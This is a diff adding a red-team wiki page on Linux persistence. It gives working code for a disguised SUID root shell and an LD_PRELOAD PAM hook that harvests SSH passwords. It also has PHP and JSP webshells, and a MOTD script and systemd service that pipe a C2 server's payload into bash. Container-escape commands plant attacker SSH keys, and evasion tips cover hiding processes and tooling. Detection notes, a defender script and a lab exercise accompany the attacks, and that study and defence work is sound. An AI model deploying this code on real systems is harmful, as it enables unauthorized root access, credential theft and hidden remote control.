+						<p>
+							A SUID binary (setuid root) executes with the
+							<b>effective UID</b>
+							of the file owner regardless
+							of who runs it. If you can drop a SUID root binary that spawns a shell, any user can become
+							root.
+						</p>
+						<pre class="c">
+/*
+ * suid_shell.c — A SUID root shell spawner
+ * Compile: gcc -o /usr/local/bin/dbus-monitor suid_shell.c
+ *
+ * The binary name mimics a legitimate utility.
+ * It spawns a bash shell with effective UID 0.
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main(int argc, char **argv)
+{
+    /* Drop a log entry to appear legitimate */
+    FILE *log = fopen(&#34;/var/log/dbus-monitor.log&#34;, &#34;a&#34;);
+    if (log) {
+        fprintf(log, &#34;DBus monitor started by UID %d\n&#34;, getuid());
+        fclose(log);
+    }
+
+    /* Spawn root shell */
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+
+    char *shell = &#34;/bin/bash&#34;;
+    char *args[] = { &#34;bash&#34;, &#34;-p&#34;, NULL };  /* -p = privileged mode */
+    execve(shell, args, NULL);
+    return 0;
+}
+						</pre>
+						<p>Deploy (requires root to set SUID):</p>
+						<pre class="bash">
+gcc -o /usr/local/bin/dbus-monitor suid_shell.c
+chown root:root /usr/local/bin/dbus-monitor
+chmod 4755 /usr/local/bin/dbus-monitor  # setuid bit
+
+# Test
+/usr/local/bin/dbus-monitor
+id  # uid=1000(user) gid=1000(user) euid=0(root) groups=...
+						</pre>
+						<p>
+							<b>Common SUID hiding locations</b>
+							: -
+							<code>/usr/local/bin/</code>
+							- locally compiled binaries, often overlooked
+							<ul>
+								<li><code>/usr/local/sbin/</code> - same, for sysadmin tools</li>
+								<li><code>/opt/</code> - third-party software</li>
+								<li><code>/usr/libexec/</code> - helper binaries</li>
+								<li><code>/var/lib/</code> - data directories with executables</li>
+							</ul>
+						</p>
+						<p>
+							<b>Detect</b>
+							:
+							<code>find / -perm -4000 -type f -ls 2&gt;/dev/null</code>
+							- compare against a known-good baseline.
+							Pay special attention to binaries NOT owned by a package manager (
+							<code>dpkg -S /path/to/binary</code>
+							returns "not found").
+						</p>
+					</section>
+					<section>
+						<h3 id="ssh-backdoor-sshd-patching">SSH Backdoor (sshd Patching)</h3>
+						<p>
+							Patching the sshd binary to accept a master password or log all passwords is the most powerful
+							persistence - it survives reboots, package upgrades (if you replace the backup), and provides
+							ongoing credential harvesting.
+						</p>
+						<h4 id="password-logging-patch">Password Logging Patch</h4>
+						<p>
+							Instead of recompiling, attach a shared library via
+							<code>LD_PRELOAD</code>
+							that hooks the password-reading
+							function. Open
+							<abbr title="Secure Shell">SSH</abbr>
+							uses
+							<code>mm_answer_authpassword()</code>
+							internally, but the
+							<code>PAM</code>
+							-based approach is more portable:
+						</p>
+						<pre class="bash">
+# This is a simplified approach using LD_PRELOAD on sshd
+# On systemd systems, edit the service file to add Environment=
+mkdir -p /etc/systemd/system/sshd.service.d/
+cat &gt; /etc/systemd/system/sshd.service.d/logging.conf &lt;&lt; &#39;EOF&#39;
+[Service]
+Environment=&#34;LD_PRELOAD=/lib/libsshlog.so&#34;
+EOF
+
+systemctl daemon-reload
+systemctl restart sshd
+						</pre>
+						<p>
+							The hook library intercepts
+							<code>pam_get_authtok()</code>
+							or
+							<code>crypt()</code>
+							:
+						</p>
+						<pre class="c">
+/*
+ * ssh_log.c — Intercept SSH password via PAM hook
+ * Compile: gcc -shared -fPIC -o /lib/libsshlog.so ssh_log.c -ldl
+ */
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;dlfcn.h&gt;
+#include &lt;time.h&gt;
+#include &lt;security/pam_modules.h&gt;
+
+static int (*real_pam_get_authtok)(
+    pam_handle_t *, int, const char **, const char *) = NULL;
+
+int pam_get_authtok(pam_handle_t *pamh, int item,
+    const char **authtok, const char *prompt)
+{
+    if (!real_pam_get_authtok) {
+        real_pam_get_authtok = dlsym(RTLD_NEXT, &#34;pam_get_authtok&#34;);
+    }
+
+    int result = real_pam_get_authtok(pamh, item, authtok, prompt);
+
+    if (result == 0 &amp;&amp; authtok &amp;&amp; *authtok) {
+        const char *user = NULL;
+        pam_get_user(pamh, &amp;user, NULL);
+
+        FILE *logfile = fopen(&#34;/var/log/.sshd_audit.log&#34;, &#34;a&#34;);
+        if (logfile) {
+            time_t now = time(NULL);
+            fprintf(logfile, &#34;[%s] user=%s password=%s\n&#34;,
+                ctime(&amp;now), user ? user : &#34;?&#34;, *authtok);
+            fclose(logfile);
+        }
+    }
+
+    return result;
+}
+						</pre>
+						<p>
+							<b>Detect</b>
+							: Check the sshd systemd unit for
+							<code>LD_PRELOAD</code>
+							, check
+							<code>/etc/ld.so.preload</code>
+							, verify
+							package integrity of
+							<code>/usr/sbin/sshd</code>
+							with
+							<code>dpkg --verify openssh-server</code>
+							or
+							<code>rpm -V openssh-server</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="web-shell-persistence">Web Shell Persistence</h3>
+						<p>
+							If the target runs a web server (Apache, Nginx, Lighttpd), dropping a web shell in the document
+							root provides
+							<abbr title="Hypertext Transfer Protocol">HTTP</abbr>
+							-based access that bypasses firewalls.
+						</p>
+						<h4 id="php-webshell-single-liner">PHP webshell (single-liner)</h4>
+						<pre class="bash">
+echo &#39;&lt;?php system($_GET[&#34;cmd&#34;]); ?&gt;&#39; &gt; /var/www/html/.css.php
+echo &#39;&lt;?php eval(base64_decode($_POST[&#34;d&#34;])); ?&gt;&#39; &gt; /var/www/html/modules/config.inc.php
+
+# Test
+curl &#39;http://target/.css.php?cmd=id&#39;
+						</pre>
+						<h4 id="jsp-webshell-tomcatjboss">JSP webshell (Tomcat/JBoss)</h4>
+						<pre class="bash">
+cat &gt; /opt/tomcat/webapps/ROOT/shell.jsp &lt;&lt; &#39;JSP_EOF&#39;
+&lt;%@ page import=&#34;java.io.*&#34; %&gt;
+&lt;%
+    String cmd = request.getParameter(&#34;cmd&#34;);
+    if (cmd != null) {
+        Process p = Runtime.getRuntime().exec(cmd);
+        BufferedReader reader = new BufferedReader(
+            new InputStreamReader(p.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            out.println(line);
+        }
+    }
+%&gt;
+JSP_EOF
+						</pre>
+						<h4 id="hidden-webshell-techniques">Hidden webshell techniques</h4>
+						<ul>
+							<li>Name the file after an existing legitimate file, e.g., <code>wp-config-sample.php</code> becomes <code>wp-conf-sample.php</code></li>
+							<li>Set the mtime to match other files in the directory: <code>touch -r /var/www/html/index.php /var/www/html/.shell.php</code></li>
+							<li>Use <code>/dev/shm/</code> as a CGI script directory if the web server has CGI enabled</li>
+							<li>Drop webshells in upload directories where <code>.php</code> execution might be misconfigured</li>
+						</ul>
+						<p>
+							<b>Detect</b>
+							:
+							<code>find /var/www -name &#39;*.php&#39; -newermt &#34;2026-01-01&#34; -ls</code>
+							. Check for
+							<abbr title="PHP Hypertest Preprocessor">PHP</abbr>
+							files containing
+							<code>$_GET</code>
+							,
+							<code>$_POST</code>
+							,
+							<code>exec</code>
+							,
+							<code>system</code>
+							,
+							<code>passthru</code>
+							,
+							<code>eval</code>
+							,
+							<code>base64_decode</code>
+							. Use
+							<code>grep -r &#39;system\|exec\|passthru\|eval&#39; /var/www --include=&#39;*.php&#39;</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="motd-issue-file-persistence">MOTD / Issue File Persistence</h3>
+						<p>
+							<code>/etc/update-motd.d/</code>
+							scripts execute on every
+							<abbr title="Secure Shell">SSH</abbr>
+							login before the shell prompt
+							appears. These run as root (the
+							<abbr title="Privileged Access Management">PAM</abbr>
+							motd module is invoked in
+							the privileged sshd context).
+						</p>
+						<pre class="bash">
+cat &gt; /etc/update-motd.d/99-sysinfo &lt;&lt; &#39;MOTD_EOF&#39;
+#!/bin/bash
+# Appears to print system information
+echo &#34;System information as of $(date)&#34;
+
+# Actual payload: beacon home
+curl -s --connect-timeout 3 https://c2.example.com/login 2&gt;/dev/null | bash &amp;&gt;/dev/null &amp;
+
+# Optional: check if reverse shell is needed
+MOTD_EOF
+
+chmod 755 /etc/update-motd.d/99-sysinfo
+
+# Verify: SSH to the target and watch for the beacon
+						</pre>
+						<p>
+							Also check
+							<code>/etc/motd</code>
+							(static),
+							<code>/etc/issue</code>
+							(pre-login), and
+							<code>/etc/issue.net</code>
+							(telnet pre-login).
+						</p>
+						<p>
+							<b>Detect</b>
+							:
+							<code>ls -la /etc/update-motd.d/</code>
+							- look for scripts with high numeric prefixes (99-*
+							are meant to run last, attacker preference). Grep for network commands and execution chains.
+						</p>
+					</section>
+					<section>
+						<h3 id="container-escape-persistence">Container Escape Persistence</h3>
+						<p>
+							If you are root inside a privileged container (or have access to the Docker socket), you can
+							modify the host filesystem.
+						</p>
+						<h4 id="via-privileged-container">Via privileged container</h4>
+						<pre class="bash">
+# Inside a privileged container, find the host&#39;s root filesystem
+lsblk    # identify the host&#39;s root partition (/dev/sda, /dev/nvme0n1p2, etc.)
+mkdir -p /mnt/host
+mount /dev/sda2 /mnt/host  # adjust device to match
+
+# Now you can write to the host filesystem
+echo &#39;ssh-ed25519 AAAAC3...&#39; &gt;&gt; /mnt/host/root/.ssh/authorized_keys
+echo &#39;* * * * * root /usr/local/bin/beacon&#39; &gt;&gt; /mnt/host/etc/crontab
+
+# Or add a systemd service directly
+cat &gt; /mnt/host/etc/systemd/system/container-escape.service &lt;&lt; &#39;EOF&#39;
+[Unit]
+Description=Container Health Check
+[Service]
+Type=simple
+ExecStart=/usr/bin/curl -s https://c2.example.com/init | /bin/bash
+[Install]
+WantedBy=multi-user.target
+EOF
+						</pre>
+						<h4 id="via-container-socket">Via container socket</h4>
+						<p>
+							If the podman socket (
+							<code>/run/podman/podman.sock</code>
+							) or Docker socket is mounted into the container:
+						</p>
+						<pre class="bash">
+# From inside the container, deploy a privileged container that mounts the host
+podman run -d --name esc \
+    -v /:/host \
+    --privileged \
+    alpine:latest \
+    sh -c &#39;echo &#34;ssh-ed25519 AAAAC3...&#34; &gt;&gt; /host/root/.ssh/authorized_keys; while true; do sleep 3600; done&#39;
+						</pre>
+						<p>
+							<b>Detect</b>
+							: Monitor for unexpected mount operations inside containers. Monitor the container
+							runtime for creation of privileged containers or containers mounting host paths.
+							<code>podman events --filter type=container</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="detection-script">Detection Script</h3>
+						<p>A defender-side script that checks for common persistence mechanisms:</p>
+						<pre class="bash">
+#!/bin/bash
+# detect-persistence.sh — Check for common Linux persistence indicators
+
+echo &#34;=== SSH authorized_keys files ===&#34;
+find /home /root -name authorized_keys -ls 2&gt;/dev/null
+
+echo &#34;=== UID 0 accounts ===&#34;
+awk -F: &#39;($3 == 0) {print &#34;  &#34; $1 &#34; (UID=&#34; $3 &#34;)&#34;}&#39; /etc/passwd
+
+echo &#34;=== Cron entries ===&#34;
+for dir in /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily \
+           /etc/cron.weekly /etc/cron.monthly /var/spool/cron/crontabs; do
+    if [ -f &#34;$dir&#34; ]; then
+        echo &#34;--- $dir ---&#34;
+        cat &#34;$dir&#34; 2&gt;/dev/null
+    elif [ -d &#34;$dir&#34; ]; then
+        echo &#34;--- $dir/ ---&#34;
+        find &#34;$dir&#34; -type f -exec ls -la {} \; 2&gt;/dev/null
+    fi
+done
+
+echo &#34;=== Systemd user services ===&#34;
+find /home -path &#39;*/.config/systemd/user/*.service&#39; -ls 2&gt;/dev/null
+
+echo &#34;=== Systemd system services (non-package) ===&#34;
+for svc in /etc/systemd/system/*.service; do
+    pkg=$(dpkg -S &#34;$svc&#34; 2&gt;/dev/null || rpm -qf &#34;$svc&#34; 2&gt;/dev/null)
+    if [ -z &#34;$pkg&#34; ]; then
+        echo &#34;  UNOWNED: $svc&#34;
+    fi
+done 2&gt;/dev/null
+
+echo &#34;=== LD_PRELOAD checks ===&#34;
+echo &#34;  /etc/ld.so.preload:&#34;
+cat /etc/ld.so.preload 2&gt;/dev/null || echo &#34;  (empty or missing)&#34;
+echo &#34;  Processes with LD_PRELOAD:&#34;
+grep -l &#39;LD_PRELOAD&#39; /proc/*/environ 2&gt;/dev/null | while read f; do
+    pid=$(echo &#34;$f&#34; | cut -d/ -f3)
+    echo &#34;  PID $pid: $(cat /proc/$pid/cmdline 2&gt;/dev/null | tr &#39;\0&#39; &#39; &#39;)&#34;
+done
+
+echo &#34;=== SUID binaries ===&#34;
+find / -perm -4000 -type f -ls 2&gt;/dev/null
+
+echo &#34;=== MOTD scripts ===&#34;
+ls -la /etc/update-motd.d/ 2&gt;/dev/null
+
+echo &#34;=== Web shells (PHP) ===&#34;
+find /var/www -name &#39;*.php&#39; -newermt &#34;2026-01-01&#34; -ls 2&gt;/dev/null
+
+echo &#34;=== PAM configuration ===&#34;
+grep -v &#39;^#&#39; /etc/pam.d/common-auth 2&gt;/dev/null | grep -v &#39;^$&#39;
+grep -v &#39;^#&#39; /etc/pam.d/common-password 2&gt;/dev/null | grep -v &#39;^$&#39;
+
+echo &#34;=== Shell rc files ===&#34;
+find /home /root -maxdepth 2 \( -name &#39;.bashrc&#39; -o -name &#39;.profile&#39; \
+    -o -name &#39;.zshrc&#39; -o -name &#39;.bash_profile&#39; \) -ls 2&gt;/dev/null
+
+echo &#34;=== Unknown shared objects in /lib/security/ ===&#34;
+find /lib/security -name &#39;*.so&#39; ! -name &#39;pam_*&#39; -ls 2&gt;/dev/null
+						</pre>
+					</section>
+					<section>
+						<h3 id="common-mistakes">Common Mistakes</h3>
+						<ol>
+							<li><b>Using '/tmp' for payloads</b> : systemd <code>PrivateTmp=yes</code> makes <code>/tmp</code> process-private for many services. Use <code>/var/tmp/</code> , <code>/dev/shm/</code> , or user home directories.</li>
+						</ol>
+						<ol>
+							<li><b>Infinite restart loops</b> : A cron job that forks without disowning can consume PID space. Always <code>nohup</code> and <code>disown</code> , or use <code>setsid</code> .</li>
+						</ol>
+						<ol>
+							<li><b>Visible process names</b> : The process list ( <code>ps aux</code> ) exposes your payload path. Mask it: mount a tmpfs over <code>/proc</code> , or use <code>exec -a legit_name /actual/payload</code> .</li>
+						</ol>
+						<ol>
+							<li><b>Forgetting SELinux</b> : SELinux blocks many persistence locations. Always <code>restorecon -R</code> or use <code>chcon -t</code> to set the correct context.</li>
+						</ol>
+						<ol>
+							<li><b>Reusing the same persistence across engagements</b> : Blue teams share IoCs. Vary filenames, <abbr title="Command and Control">C2</abbr>  <abbr title="Uniform Resource Locator">URL</abbr> s, and persistence types between operations.</li>
+						</ol>
+						<ol>
+							<li><b>Not testing reboot survival</b> : Simulate a reboot by restarting all relevant services. In a container: <code>podman restart &lt;container&gt;</code> . On bare metal: trigger a kernel panic safely with <code>echo b &gt; /proc/sysrq-trigger</code> (in a <abbr title="Virtual Machine">VM</abbr> ).</li>
+						</ol>
+						<ol>
+							<li><b>Leaving your tools in obvious locations</b> : <code>/tmp/nc</code> , <code>/tmp/revshell.sh</code> etc. Delete or hide your deployment tooling after persistence is established.</li>
+						</ol>
+					</section>
+					<section>
+						<h3 id="challenge">Challenge</h3>
+						<p>
+							Install at least three persistence mechanisms inside the lab container, restart it, and confirm
+							each one survives. Then run the bundled detector and find them the way a defender would.
+						</p>
+						<p><a href="/wiki/articles/redteam/persistence.Containerfile">persistence.Containerfile</a></p>
+						<pre class="bash">
+podman build -t persistence -f persistence.Containerfile .
+podman run -d --name persist-lab -p 2222:22 persistence
+
+# Log in (password: changeme)
+ssh root@localhost -p 2222
+# or: ssh victim@localhost -p 2222
+
+# The lab ships exercises and a detector:
+ls /opt/persistence-lab/exercises/
+/opt/persistence-lab/persistence-detector.sh
+
+# Add mechanisms inside the container, then prove they survive a restart:
+(crontab -l 2&gt;/dev/null; echo &#34;*/5 * * * * touch /tmp/.persist_test&#34;) | crontab -
+echo &#39;ssh-ed25519 AAAA... operator@lab&#39; &gt;&gt; /root/.ssh/authorized_keys
+podman stop persist-lab &amp;&amp; podman start persist-lab
+
+# Reconnect and verify:
+ssh root@localhost -p 2222 &#39;crontab -l; cat /root/.ssh/authorized_keys&#39;
+
+# Cleanup:
+podman rm -f persist-lab
+						</pre>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://attack.mitre.org/tactics/TA0003/" target="_blank">MITRE ATT&CK - Persistence (TA0003)</a></li>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1053/" target="_blank">MITRE ATT&CK - Scheduled Task/Job (T1053)</a></li>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1543/" target="_blank">MITRE ATT&CK - Create or Modify System Process (T1543)</a></li>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1546.004/" target="_blank">MITRE ATT&CK - Unix Shell Configuration Modification (T1546.004)</a></li>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1556/003/" target="_blank">MITRE ATT&CK - Pluggable Authentication Modules (T1556.003)</a></li>
+							<li><a class="icon-website" href="https://attack.mitre.org/techniques/T1574.006/" target="_blank">MITRE ATT&CK - Dynamic Linker Hijacking (T1574.006)</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man8/pam.8.html" target="_blank">pam(8) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://man7.org/linux/man-pages/man8/ld.so.8.html" target="_blank">ld.so(8) - Linux manual page</a></li>
+							<li><a class="icon-website" href="https://www.freedesktop.org/software/systemd/man/systemd.service.html" target="_blank">systemd.service(5) - systemd manual</a></li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
